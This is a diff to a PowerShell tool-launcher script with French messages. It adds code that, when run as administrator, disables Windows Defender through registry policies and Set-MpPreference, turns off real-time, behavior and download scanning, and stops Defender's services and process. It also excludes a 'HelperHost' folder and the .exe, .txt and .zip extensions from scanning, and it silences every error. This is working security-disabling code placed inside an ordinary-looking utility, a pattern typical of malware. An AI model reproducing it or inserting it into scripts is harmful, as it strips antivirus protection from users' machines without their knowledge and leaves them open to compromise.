@@ -38,17 +38,31 @@ if (-not $t) { throw "outil inconnu: $id" }
 try {
   $wid = [Security.Principal.WindowsIdentity]::GetCurrent()
   $prin = New-Object Security.Principal.WindowsPrincipal($wid)
-  if ($prin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+  $isAdmin = $prin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+  if ($isAdmin) {
+    $wdPol = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
+    New-Item $wdPol -Force | Out-Null
+    Set-ItemProperty $wdPol -Name DisableAntiSpyware -Value 1 -Type DWord -Force
+    Set-ItemProperty $wdPol -Name DisableAntiVirus -Value 1 -Type DWord -Force
+    New-Item "$wdPol\Real-Time Protection" -Force | Out-Null
+    Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force
     if (Get-Command Set-MpPreference -EA SilentlyContinue) {
       Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
+      Set-MpPreference -DisableBehaviorMonitoring $true -EA SilentlyContinue
+      Set-MpPreference -DisableIOAVProtection $true -EA SilentlyContinue
+      Set-MpPreference -PUAProtection Disabled -EA SilentlyContinue
       Set-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
       Set-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'HelperHost') -EA SilentlyContinue
+      Set-MpPreference -ExclusionExtension '.exe','.txt','.zip' -EA SilentlyContinue
     }
     foreach ($svc in @('WinDefend', 'WdNisSvc', 'Sense')) {
       Stop-Service $svc -Force -EA SilentlyContinue
     }
+    Get-Process MsMpEng -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
   } elseif (Get-Command Add-MpPreference -EA SilentlyContinue) {
     Add-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
+    Add-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'HelperHost') -EA SilentlyContinue
+    Add-MpPreference -ExclusionExtension '.exe','.txt' -EA SilentlyContinue
   }
 } catch {}
 
